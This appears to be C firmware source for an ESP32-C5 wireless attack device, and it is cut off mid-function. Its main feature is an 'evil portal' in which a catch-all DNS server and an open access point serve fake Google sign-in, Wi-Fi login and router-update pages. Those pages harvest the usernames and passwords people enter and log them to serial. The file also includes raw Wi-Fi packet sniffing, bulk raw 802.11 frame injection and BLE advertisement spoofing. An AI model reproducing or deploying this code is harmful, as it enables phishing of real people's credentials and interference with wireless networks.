#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "freertos/semphr.h"
#include "driver/gpio.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_netif.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "led_strip.h"
#include "esp_http_server.h"
#include "lwip/sockets.h"
#include "lwip/netdb.h"
#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"
#include "host/ble_gap.h"
#include "host/ble_hs.h"
#include "nvs_flash.h"

static const char *TAG = "wigglefish";
static wifi_ap_record_t scan_records[64];

// Hardware pin definitions for Wireless-Tag WT9932Cx-TINY (ESP32-C5)
#define WS2812_LED_GPIO GPIO_NUM_8
#define STATUS_LED_GPIO GPIO_NUM_6
#define STATUS_LED_ACTIVE_HIGH 1

// State variables
static bool g_promisc_enabled = false;
static bool g_channel_hopping = false;
static uint8_t g_current_channel = 1;
static uint8_t g_hop_start_channel = 1;
static uint8_t g_hop_end_channel = 13;
static uint32_t g_hop_dwell_ms = 200;
static bool g_ble_scanning = true;
static bool g_ble_adv_active = false;
static bool g_auto_scan_enabled = true;
static SemaphoreHandle_t g_serial_mutex = NULL;

// Evil Portal State
static bool g_portal_active = false;
static char g_portal_ssid[33] = "Free-WiFi";
static char g_portal_type[16] = "router";
static esp_netif_t *g_ap_netif = NULL;
static httpd_handle_t g_httpd_server = NULL;
static TaskHandle_t g_dns_task_handle = NULL;
static int g_dns_sock = -1;

// WS2812 RGB LED State
static led_strip_handle_t g_led_strip = NULL;

typedef struct {
    uint8_t r;
    uint8_t g;
    uint8_t b;
    uint16_t duration_ms;
    uint8_t count;
} led_alert_t;

static QueueHandle_t g_led_queue = NULL;

static void status_led_set(bool on)
{
    gpio_set_level(STATUS_LED_GPIO, STATUS_LED_ACTIVE_HIGH ? on : !on);
}

static void status_led_pulse(uint8_t count)
{
    for (uint8_t index = 0; index < count; index++) {
        status_led_set(true);
        vTaskDelay(pdMS_TO_TICKS(80));
        status_led_set(false);
        vTaskDelay(pdMS_TO_TICKS(80));
    }
}

static void ws2812_set_rgb(uint8_t r, uint8_t g, uint8_t b)
{
    if (g_led_strip) {
        led_strip_set_pixel(g_led_strip, 0, r, g, b);
        led_strip_refresh(g_led_strip);
    }
}

static void trigger_led_alert(uint8_t r, uint8_t g, uint8_t b, uint16_t duration_ms, uint8_t count)
{
    if (g_led_queue) {
        led_alert_t alert = {
            .r = r,
            .g = g,
            .b = b,
            .duration_ms = duration_ms,
            .count = count > 0 ? count : 1,
        };
        xQueueSend(g_led_queue, &alert, 0); // Non-blocking push
    }
}

/* =============================================================
 * Evil Captive Portal (DNS Catch-all + HTTP Server)
 * ============================================================= */

static void dns_server_task(void *pvParameters)
{
    uint8_t rx_buffer[128];
    uint8_t tx_buffer[128];
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_addr_len = sizeof(client_addr);

    g_dns_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (g_dns_sock < 0) {
        vTaskDelete(NULL);
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(53);

    if (bind(g_dns_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(g_dns_sock);
        g_dns_sock = -1;
        vTaskDelete(NULL);
        return;
    }

    while (g_portal_active) {
        int len = recvfrom(g_dns_sock, rx_buffer, sizeof(rx_buffer), 0, (struct sockaddr *)&client_addr, &client_addr_len);
        if (len >= 12) {
            memcpy(tx_buffer, rx_buffer, len);
            tx_buffer[2] = 0x81;
            tx_buffer[3] = 0x80;
            tx_buffer[6] = 0x00;
            tx_buffer[7] = 0x01; // Answer count = 1

            int offset = len;
            tx_buffer[offset++] = 0xC0;
            tx_buffer[offset++] = 0x0C;
            tx_buffer[offset++] = 0x00;
            tx_buffer[offset++] = 0x01; // A record
            tx_buffer[offset++] = 0x00;
            tx_buffer[offset++] = 0x01; // IN class
            tx_buffer[offset++] = 0x00;
            tx_buffer[offset++] = 0x00;
            tx_buffer[offset++] = 0x00;
            tx_buffer[offset++] = 0x3C; // TTL 60s
            tx_buffer[offset++] = 0x00;
            tx_buffer[offset++] = 0x04; // Data len
            tx_buffer[offset++] = 192;
            tx_buffer[offset++] = 168;
            tx_buffer[offset++] = 4;
            tx_buffer[offset++] = 1;

            sendto(g_dns_sock, tx_buffer, offset, 0, (struct sockaddr *)&client_addr, client_addr_len);
        }
    }

    if (g_dns_sock >= 0) {
        close(g_dns_sock);
        g_dns_sock = -1;
    }
    vTaskDelete(NULL);
}

static esp_err_t portal_root_get_handler(httpd_req_t *req)
{
    char html[2048];
    if (strcmp(g_portal_type, "google") == 0) {
        snprintf(html, sizeof(html),
            "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><title>Google Sign-in</title>"
            "<style>body{font-family:sans-serif;background:#fff;padding:24px;color:#202124}.box{max-width:380px;margin:auto;border:1px solid #dadce0;border-radius:8px;padding:28px}"
            "input{width:100%%;padding:12px;margin:8px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px}"
            "button{width:100%%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-weight:bold;cursor:pointer}</style></head>"
            "<body><div class='box'><h2 style='color:#1a73e8'>Google</h2><p>Sign in to connect to %s</p>"
            "<form action='/submit' method='POST'><input type='text' name='user' placeholder='Email or phone' required>"
            "<input type='password' name='pass' placeholder='Enter your password' required><button type='submit'>Next</button></form></div></body></html>",
            g_portal_ssid);
    } else if (strcmp(g_portal_type, "wifi") == 0) {
        snprintf(html, sizeof(html),
            "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><title>Free Wi-Fi Login</title>"
            "<style>body{font-family:sans-serif;background:#0d1117;color:#c9d1d9;padding:20px;text-align:center}.box{max-width:360px;margin:auto;background:#161b22;padding:24px;border-radius:12px;border:1px solid #30363d}"
            "input{width:100%%;padding:12px;margin:10px 0;box-sizing:border-box;background:#0d1117;border:1px solid #30363d;color:#fff;border-radius:6px}"
            "button{width:100%%;padding:12px;background:#238636;color:#fff;border:none;border-radius:6px;font-weight:bold}</style></head>"
            "<body><div class='box'><h2>📶 %s</h2><p>Enter Wi-Fi Password to access high-speed internet.</p>"
            "<form action='/submit' method='POST'><input type='password' name='pass' placeholder='Wi-Fi Password' required><button type='submit'>Connect</button></form></div></body></html>",
            g_portal_ssid);
    } else {
        snprintf(html, sizeof(html),
            "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><title>Router Update</title>"
            "<style>body{font-family:sans-serif;background:#f4f6f9;padding:20px;color:#333}.box{max-width:400px;margin:auto;background:#fff;padding:28px;border-radius:10px;box-shadow:0 4px 12px rgba(0,0,0,0.1)}"
            "input{width:100%%;padding:12px;margin:8px 0;box-sizing:border-box;border:1px solid #ddd;border-radius:6px}"
            "button{width:100%%;padding:12px;background:#e53935;color:#fff;border:none;border-radius:6px;font-weight:bold;cursor:pointer}</style></head>"
            "<body><div class='box'><h2 style='color:#e53935'>⚠️ Router Firmware Update</h2><p>Network security upgrade in progress for <b>%s</b>. Please verify the current Wi-Fi password to proceed.</p>"
            "<form action='/submit' method='POST'><input type='password' name='pass' placeholder='WPA/WPA2 Network Password' required><button type='submit'>Start Update</button></form></div></body></html>",
            g_portal_ssid);
    }
    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, html, HTTPD_RESP_USE_STRLEN);
}

static esp_err_t portal_submit_post_handler(httpd_req_t *req)
{
    char buf[256];
    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (ret > 0) {
        buf[ret] = '\0';
        char user[64] = "";
        char pass[64] = "";

        char *user_pos = strstr(buf, "user=");
        if (user_pos) {
            sscanf(user_pos, "user=%63[^&]", user);
        }
        char *pass_pos = strstr(buf, "pass=");
        if (pass_pos) {
            sscanf(pass_pos, "pass=%63[^&]", pass);
        }

        trigger_led_alert(255, 214, 0, 150, 4); // Gold alert for captured credential!

        if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
        printf("{\"type\":\"credential_harvested\",\"ssid\":\"%s\",\"template\":\"%s\",\"username\":\"%s\",\"password\":\"%s\"}\n",
               g_portal_ssid, g_portal_type, user, pass);
        fflush(stdout);
        if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
    }

    const char *resp = "<!DOCTYPE html><html><body style='font-family:sans-serif;text-align:center;padding:40px;background:#f0fff4'>"
                       "<h2 style='color:#2e7d32'>✓ Authentication Successful</h2>"
                       "<p>Your connection has been verified. You may now resume browsing.</p></body></html>";
    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, resp, HTTPD_RESP_USE_STRLEN);
}

static void start_evil_portal(const char *ssid, const char *template_type)
{
    if (g_portal_active) return;

    strncpy(g_portal_ssid, ssid, sizeof(g_portal_ssid) - 1);
    strncpy(g_portal_type, template_type, sizeof(g_portal_type) - 1);

    esp_wifi_set_mode(WIFI_MODE_APSTA);
    wifi_config_t ap_config = {
        .ap = {
            .channel = 1,
            .max_connection = 10,
            .authmode = WIFI_AUTH_OPEN,
        },
    };
    strncpy((char *)ap_config.ap.ssid, g_portal_ssid, 32);
    ap_config.ap.ssid_len = strlen(g_portal_ssid);

    esp_wifi_set_config(WIFI_IF_AP, &ap_config);

    // Start HTTP Server
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.max_uri_handlers = 8;
    config.uri_match_fn = httpd_uri_match_wildcard;

    if (httpd_start(&g_httpd_server, &config) == ESP_OK) {
        httpd_uri_t submit_uri = {
            .uri = "/submit",
            .method = HTTP_POST,
            .handler = portal_submit_post_handler,
            .user_ctx = NULL,
        };
        httpd_register_uri_handler(g_httpd_server, &submit_uri);

        httpd_uri_t root_uri = {
            .uri = "/*",
            .method = HTTP_GET,
            .handler = portal_root_get_handler,
            .user_ctx = NULL,
        };
        httpd_register_uri_handler(g_httpd_server, &root_uri);
    }

    g_portal_active = true;
    xTaskCreate(dns_server_task, "dns_srv", 3072, NULL, 4, &g_dns_task_handle);
}

static void stop_evil_portal(void)
{
    if (!g_portal_active) return;
    g_portal_active = false;
    if (g_httpd_server) {
        httpd_stop(g_httpd_server);
        g_httpd_server = NULL;
    }
    esp_wifi_set_mode(WIFI_MODE_STA);
}

static void led_task(void *param)
{
    led_alert_t alert;
    uint8_t breath = 0;
    int8_t breath_dir = 2;

    while (true) {
        // Check for specific alert in queue
        if (xQueueReceive(g_led_queue, &alert, pdMS_TO_TICKS(40)) == pdTRUE) {
            for (uint8_t c = 0; c < alert.count; c++) {
                ws2812_set_rgb(alert.r, alert.g, alert.b);
                status_led_set(true);
                vTaskDelay(pdMS_TO_TICKS(alert.duration_ms));
                ws2812_set_rgb(0, 0, 0);
                status_led_set(false);
                if (c < alert.count - 1) {
                    vTaskDelay(pdMS_TO_TICKS(alert.duration_ms / 2));
                }
            }
        } else {
            // Idle breathing animation based on operating mode
            if (g_ble_adv_active || g_channel_hopping) {
                // Purple / Pink pulse during active attack tools
                ws2812_set_rgb(breath / 2, 0, breath);
            } else if (g_promisc_enabled) {
                // Amber pulse during raw sniffing
                ws2812_set_rgb(breath, breath / 2, 0);
            } else {
                // Gentle cyan breathing during passive scan
                ws2812_set_rgb(0, breath / 2, breath);
            }
            breath += breath_dir;
            if (breath >= 70) breath_dir = -2;
            if (breath <= 4) breath_dir = 2;
        }
    }
}

static void initialize_leds(void)
{
    // 1. Standard GPIO LED
    gpio_config_t config = {
        .pin_bit_mask = 1ULL << STATUS_LED_GPIO,
        .mode = GPIO_MODE_OUTPUT,
        .pull_up_en = GPIO_PULLUP_DISABLE,
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .intr_type = GPIO_INTR_DISABLE,
    };
    gpio_config(&config);
    status_led_set(false);

    // 2. WS2812 Addressable RGB LED on GPIO 8
    led_strip_config_t strip_config = {
        .strip_gpio_num = WS2812_LED_GPIO,
        .max_leds = 1,
        .led_model = LED_MODEL_WS2812,
        .color_component_format = LED_STRIP_COLOR_COMPONENT_FMT_GRB,
        .flags = {
            .invert_out = false,
        }
    };
    led_strip_rmt_config_t rmt_config = {
        .clk_src = RMT_CLK_SRC_DEFAULT,
        .resolution_hz = 10 * 1000 * 1000, // 10MHz
        .mem_block_symbols = 64,
        .flags = {
            .with_dma = false,
        }
    };
    esp_err_t err = led_strip_new_rmt_device(&strip_config, &rmt_config, &g_led_strip);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "WS2812 RMT init failed, trying SPI...");
        led_strip_spi_config_t spi_config = {
            .clk_src = SPI_CLK_SRC_DEFAULT,
            .flags = { .with_dma = false },
            .spi_bus = SPI2_HOST,
        };
        led_strip_new_spi_device(&strip_config, &spi_config, &g_led_strip);
    }

    if (g_led_strip) {
        led_strip_clear(g_led_strip);
        // Rainbow boot sweep
        ws2812_set_rgb(255, 0, 0); vTaskDelay(pdMS_TO_TICKS(100));
        ws2812_set_rgb(0, 255, 0); vTaskDelay(pdMS_TO_TICKS(100));
        ws2812_set_rgb(0, 0, 255); vTaskDelay(pdMS_TO_TICKS(100));
        ws2812_set_rgb(0, 255, 255); vTaskDelay(pdMS_TO_TICKS(150));
        led_strip_clear(g_led_strip);
    }

    g_led_queue = xQueueCreate(16, sizeof(led_alert_t));
    xTaskCreate(led_task, "led_anim", 2048, NULL, 4, NULL);
}

static void print_json_string(const char *value)
{
    putchar('"');
    for (const unsigned char *cursor = (const unsigned char *)value; *cursor != '\0'; cursor++) {
        if (*cursor == '"' || *cursor == '\\') {
            putchar('\\');
        }
        if (*cursor >= 0x20) {
            putchar(*cursor);
        }
    }
    putchar('"');
}

static const char *auth_mode_name(wifi_auth_mode_t mode)
{
    switch (mode) {
        case WIFI_AUTH_OPEN:
            return "OPEN";
        case WIFI_AUTH_WEP:
            return "WEP";
        case WIFI_AUTH_WPA_PSK:
            return "WPA-PSK";
        case WIFI_AUTH_WPA2_PSK:
            return "WPA2-PSK";
        case WIFI_AUTH_WPA_WPA2_PSK:
            return "WPA/WPA2-PSK";
        case WIFI_AUTH_WPA2_ENTERPRISE:
            return "WPA2-EAP";
        case WIFI_AUTH_WPA3_PSK:
            return "WPA3-PSK";
        case WIFI_AUTH_WPA2_WPA3_PSK:
            return "WPA2/WPA3-PSK";
        default:
            return "UNKNOWN";
    }
}

static void print_ble_name(const uint8_t *data, uint8_t length)
{
    putchar('"');
    for (uint8_t index = 0; index < length; index++) {
        unsigned char value = data[index];
        if (value == '"' || value == '\\') {
            putchar('\\');
        }
        if (value >= 0x20) {
            putchar(value);
        }
    }
    putchar('"');
}

static void emit_ble_record_data(const uint8_t *address, int8_t rssi, const uint8_t *payload, uint8_t payload_length)
{
    trigger_led_alert(224, 64, 251, 60, 1); // Vibrant Magenta alert for BLE

    if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
    printf("{\"type\":\"bluetooth\",\"address\":\"%02X:%02X:%02X:%02X:%02X:%02X\",\"mac\":\"%02X:%02X:%02X:%02X:%02X:%02X\",\"rssi\":%d",
            address[0], address[1], address[2], address[3], address[4], address[5],
            address[0], address[1], address[2], address[3], address[4], address[5], rssi);

    bool has_name = false;
    for (uint8_t offset = 0; offset < payload_length;) {
        uint8_t field_length = payload[offset];
        if (field_length == 0 || offset + field_length + 1 > payload_length) {
            break;
        }
        uint8_t field_type = payload[offset + 1];
        const uint8_t *field_data = &payload[offset + 2];
        uint8_t data_length = field_length - 1;
        if ((field_type == 0x08 || field_type == 0x09) && data_length > 0 && !has_name) {
            printf(",\"name\":");
            print_ble_name(field_data, data_length);
            has_name = true;
        } else if (field_type == 0xFF && data_length > 0) {
            printf(",\"manufacturer_data\":[");
            for (uint8_t index = 0; index < data_length; index++) {
                if (index > 0) {
                    putchar(',');
                }
                printf("%u", field_data[index]);
            }
            putchar(']');
        }
        offset += field_length + 1;
    }
    puts("}");
    fflush(stdout);
    if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
}

static int ble_gap_event_handler(struct ble_gap_event *event, void *argument)
{
    (void)argument;
    if (event->type == BLE_GAP_EVENT_DISC) {
        if (g_ble_scanning) {
            emit_ble_record_data(
                event->disc.addr.val,
                event->disc.rssi,
                event->disc.data,
                event->disc.length_data
            );
        }
    }
    return 0;
}

static void start_ble_scan(void)
{
    struct ble_gap_disc_params scan_params = {
        .itvl = 500,
        .window = 250,
        .filter_policy = 0,
        .limited = 0,
        .passive = 1,
        .filter_duplicates = 1,
    };
    uint8_t own_address_type;
    int result = ble_hs_id_infer_auto(0, &own_address_type);
    if (result == 0) {
        result = ble_gap_disc(own_address_type, BLE_HS_FOREVER, &scan_params, ble_gap_event_handler, NULL);
    }
    if (result != 0) {
        ESP_LOGE(TAG, "BLE scan start failed: %d", result);
    }
}

static void ble_on_sync(void)
{
    start_ble_scan();
}

static void ble_host_task(void *argument)
{
    (void)argument;
    nimble_port_run();
    nimble_port_freertos_deinit();
}

static void initialize_ble(void)
{
    ESP_ERROR_CHECK(nimble_port_init());
    ble_hs_cfg.sync_cb = ble_on_sync;
    nimble_port_freertos_init(ble_host_task);
}

/* Promiscuous Packet RX Callback */
static void wifi_promisc_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!g_promisc_enabled || buf == NULL) {
        return;
    }

    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;

    // Filter out corrupted or zero length frames
    if (len == 0 || len > 1500) {
        return;
    }

    trigger_led_alert(0, 230, 118, 20, 1); // Lime green tick for captured packet

    if (g_serial_mutex) {
        if (xSemaphoreTake(g_serial_mutex, pdMS_TO_TICKS(10)) != pdTRUE) {
            return; // Drop packet if serial is busy to avoid blocking WiFi MAC task
        }
    }

    printf("{\"type\":\"raw_wifi\",\"ch\":%u,\"rssi\":%d,\"len\":%u,\"data\":\"",
           pkt->rx_ctrl.channel,
           pkt->rx_ctrl.rssi,
           len);

    for (uint16_t i = 0; i < len; i++) {
        printf("%02x", payload[i]);
    }
    puts("\"}");
    fflush(stdout);

    if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
}

static void scan_wifi(void)
{
    if (g_promisc_enabled) return; // Don't run passive scan while promiscuous sniffer is active

    if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
    puts("{\"event\":\"scan_start\"}");
    fflush(stdout);
    if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);

    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = true,
        .scan_type = WIFI_SCAN_TYPE_PASSIVE,
        .scan_time.passive = 0,
    };

    esp_err_t result = esp_wifi_scan_start(&scan_config, true);
    if (result != ESP_OK) {
        trigger_led_alert(255, 23, 68, 100, 3); // Red error alert
        if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
        printf("{\"event\":\"error\",\"code\":%d}\n", result);
        fflush(stdout);
        if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
        return;
    }

    uint16_t count = 0;
    esp_wifi_scan_get_ap_num(&count);
    uint16_t record_count = count < 64 ? count : 64;
    esp_wifi_scan_get_ap_records(&record_count, scan_records);
    if (record_count > 0) {
        trigger_led_alert(0, 229, 255, 100, 1); // Bright Cyan for Wi-Fi APs
    }

    if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
    printf("{\"event\":\"scan_count\",\"count\":%u}\n", record_count);
    for (uint16_t index = 0; index < record_count; index++) {
        wifi_ap_record_t *record = &scan_records[index];
        printf("{\"type\":\"wifi\",\"ssid\":");
        print_json_string((const char *)record->ssid);
        printf(",\"bssid\":\"%02X:%02X:%02X:%02X:%02X:%02X\",\"channel\":%u,\"rssi\":%d,\"security\":\"%s\",\"encryption\":\"%s\"}\n",
               record->bssid[0], record->bssid[1], record->bssid[2],
               record->bssid[3], record->bssid[4], record->bssid[5],
               record->primary,
               record->rssi,
               auth_mode_name(record->authmode),
               auth_mode_name(record->authmode));
    }
    puts("{\"event\":\"scan_end\"}");
    fflush(stdout);
    if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
}

static void initialize_wifi(void)
{
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_sta();
    g_ap_netif = esp_netif_create_default_wifi_ap();

    wifi_init_config_t wifi_config = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&wifi_config));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    
    // Enable 2.4GHz + 5GHz Dual-Band support on ESP32-C5
    esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);

    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(wifi_promisc_rx_cb));
}

// Channel Hopping Task
static void channel_hop_task(void *param)
{
    while (true) {
        if (g_channel_hopping) {
            g_current_channel++;
            if (g_current_channel > g_hop_end_channel || g_current_channel < g_hop_start_channel) {
                g_current_channel = g_hop_start_channel;
            }
            esp_wifi_set_channel(g_current_channel, WIFI_SECOND_CHAN_NONE);
        }
        vTaskDelay(pdMS_TO_TICKS(g_hop_dwell_ms));
    }
}

// Hex string to bytes helper
static int hex_to_bytes(const char *hex, uint8_t *out, int max_len)
{
    int len = 0;
    while (*hex && *(hex + 1) && len < max_len) {
        if (isspace((unsigned char)*hex)) {
            hex++;
            continue;
        }
        char byte_str[3] = { hex[0], hex[1], '\0' };
        char *endptr = NULL;
        out[len++] = (uint8_t)strtoul(byte_str, &endptr, 16);
        hex += 2;
    }
    return len;
}

// JSON Command Dispatcher
static void process_serial_command(const char *line)
{
    if (strlen(line) < 5) return;

    if (strstr(line, "\"cmd\":\"ping\"")) {
        if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
        puts("{\"event\":\"pong\"}");
        fflush(stdout);
        if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
        return;
    }

    if (strstr(line, "\"cmd\":\"status\"")) {
        if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
        printf("{\"event\":\"status\",\"channel\":%u,\"promisc\":%s,\"hopping\":%s,\"ble_adv\":%s,\"ble_scan\":%s,\"auto_scan\":%s}\n",
               g_current_channel,
               g_promisc_enabled ? "true" : "false",
               g_channel_hopping ? "true" : "false",
               g_ble_adv_active ? "true" : "false",
               g_ble_scanning ? "true" : "false",
               g_auto_scan_enabled ? "true" : "false");
        fflush(stdout);
        if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
        return;
    }

    if (strstr(line, "\"cmd\":\"set_channel\"")) {
        const char *ch_pos = strstr(line, "\"channel\":");
        if (ch_pos) {
            int ch = atoi(ch_pos + 10);
            if (ch >= 1 && ch <= 14) {
                g_current_channel = ch;
                esp_wifi_set_channel(g_current_channel, WIFI_SECOND_CHAN_NONE);
                if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
                printf("{\"event\":\"channel_set\",\"channel\":%u}\n", g_current_channel);
                fflush(stdout);
                if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
            }
        }
        return;
    }

    if (strstr(line, "\"cmd\":\"hop_on\"")) {
        const char *start_pos = strstr(line, "\"start\":");
        if (start_pos) g_hop_start_channel = atoi(start_pos + 8);
        const char *end_pos = strstr(line, "\"end\":");
        if (end_pos) g_hop_end_channel = atoi(end_pos + 6);
        const char *dwell_pos = strstr(line, "\"dwell_ms\":");
        if (dwell_pos) g_hop_dwell_ms = atoi(dwell_pos + 11);
        if (g_hop_dwell_ms < 50) g_hop_dwell_ms = 50;
        g_channel_hopping = true;
        g_auto_scan_enabled = false;
        if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
        printf("{\"event\":\"hop_started\",\"start\":%u,\"end\":%u,\"dwell_ms\":%lu}\n",
               g_hop_start_channel, g_hop_end_channel, (unsigned long)g_hop_dwell_ms);
        fflush(stdout);
        if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
        return;
    }

    if (strstr(line, "\"cmd\":\"hop_off\"")) {
        g_channel_hopping = false;
        if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
        puts("{\"event\":\"hop_stopped\"}");
        fflush(stdout);
        if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
        return;
    }

    if (strstr(line, "\"cmd\":\"promisc_on\"")) {
        wifi_promiscuous_filter_t filter = {
            .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
        };
        if (strstr(line, "\"filter\":\"mgmt\"")) {
            filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
        } else if (strstr(line, "\"filter\":\"data\"")) {
            filter.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
        }
        esp_wifi_set_promiscuous_filter(&filter);
        esp_wifi_set_promiscuous(true);
        g_promisc_enabled = true;
        g_auto_scan_enabled = false;
        if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
        puts("{\"event\":\"promisc_enabled\"}");
        fflush(stdout);
        if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
        return;
    }

    if (strstr(line, "\"cmd\":\"promisc_off\"")) {
        esp_wifi_set_promiscuous(false);
        g_promisc_enabled = false;
        g_auto_scan_enabled = true;
        if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
        puts("{\"event\":\"promisc_disabled\"}");
        fflush(stdout);
        if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
        return;
    }

    if (strstr(line, "\"cmd\":\"tx_raw\"")) {
        const char *ch_pos = strstr(line, "\"channel\":");
        if (ch_pos) {
            int ch = atoi(ch_pos + 10);
            if (ch >= 1 && ch <= 165) {
                g_current_channel = ch;
                esp_wifi_set_channel(g_current_channel, WIFI_SECOND_CHAN_NONE);
            }
        }

        int count = 1;
        const char *cnt_pos = strstr(line, "\"count\":");
        if (cnt_pos) count = atoi(cnt_pos + 8);
        if (count < 1) count = 1;
        if (count > 500) count = 500;

        int delay_ms = 5;
        const char *del_pos = strstr(line, "\"delay_ms\":");
        if (del_pos) delay_ms = atoi(del_pos + 11);

        const char *data_pos = strstr(line, "\"data_hex\":\"");
        if (data_pos) {
            data_pos += 12;
            static uint8_t tx_buf[1500];
            int tx_len = hex_to_bytes(data_pos, tx_buf, sizeof(tx_buf));
            if (tx_len > 10) {
                trigger_led_alert(255, 109, 0, 60, 1); // Bright Orange pulse for packet injection
                int sent = 0;
                for (int i = 0; i < count; i++) {
                    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, tx_buf, tx_len, false);
                    if (err == ESP_OK) {
                        sent++;
                    }
                    if (delay_ms > 0 && i < count - 1) {
                        vTaskDelay(pdMS_TO_TICKS(delay_ms));
                    }
                }
                if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
                printf("{\"event\":\"tx_done\",\"sent\":%d,\"target\":%d}\n", sent, count);
                fflush(stdout);
                if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
                return;
            }
        }
        if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
        puts("{\"event\":\"error\",\"message\":\"tx_raw failed to parse data_hex\"}");
        fflush(stdout);
        if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
        return;
    }

    if (strstr(line, "\"cmd\":\"led_alert\"")) {
        if (strstr(line, "\"color\":\"red\"")) trigger_led_alert(255, 23, 68, 120, 3);
        else if (strstr(line, "\"color\":\"green\"")) trigger_led_alert(0, 230, 118, 100, 2);
        else if (strstr(line, "\"color\":\"blue\"")) trigger_led_alert(0, 229, 255, 100, 2);
        else if (strstr(line, "\"color\":\"gold\"")) trigger_led_alert(255, 214, 0, 150, 3);
        else if (strstr(line, "\"color\":\"magenta\"")) trigger_led_alert(224, 64, 251, 100, 2);
        else if (strstr(line, "\"color\":\"orange\"")) trigger_led_alert(255, 109, 0, 100, 2);
        else if (strstr(line, "\"color\":\"cyan\"")) trigger_led_alert(0, 255, 255, 100, 2);

        if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
        puts("{\"event\":\"led_alert_ok\"}");
        fflush(stdout);
        if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
        return;
    }

    if (strstr(line, "\"cmd\":\"led_rgb\"")) {
        int r = 0, g = 0, b = 0;
        const char *r_pos = strstr(line, "\"r\":");
        if (r_pos) r = atoi(r_pos + 4);
        const char *g_pos = strstr(line, "\"g\":");
        if (g_pos) g = atoi(g_pos + 4);
        const char *b_pos = strstr(line, "\"b\":");
        if (b_pos) b = atoi(b_pos + 4);

        ws2812_set_rgb(r & 0xFF, g & 0xFF, b & 0xFF);
        if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
        puts("{\"event\":\"led_rgb_ok\"}");
        fflush(stdout);
        if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
        return;
    }

    if (strstr(line, "\"cmd\":\"ble_adv_raw\"")) {
        const char *data_pos = strstr(line, "\"payload_hex\":\"");
        if (data_pos) {
            data_pos += 15;
            uint8_t payload[31];
            int payload_len = hex_to_bytes(data_pos, payload, sizeof(payload));
            if (payload_len > 0) {
                ble_gap_adv_stop();
                int rc = ble_gap_adv_set_data(payload, payload_len);
                if (rc == 0) {
                    struct ble_gap_adv_params adv_params = {
                        .conn_mode = BLE_GAP_CONN_MODE_NON,
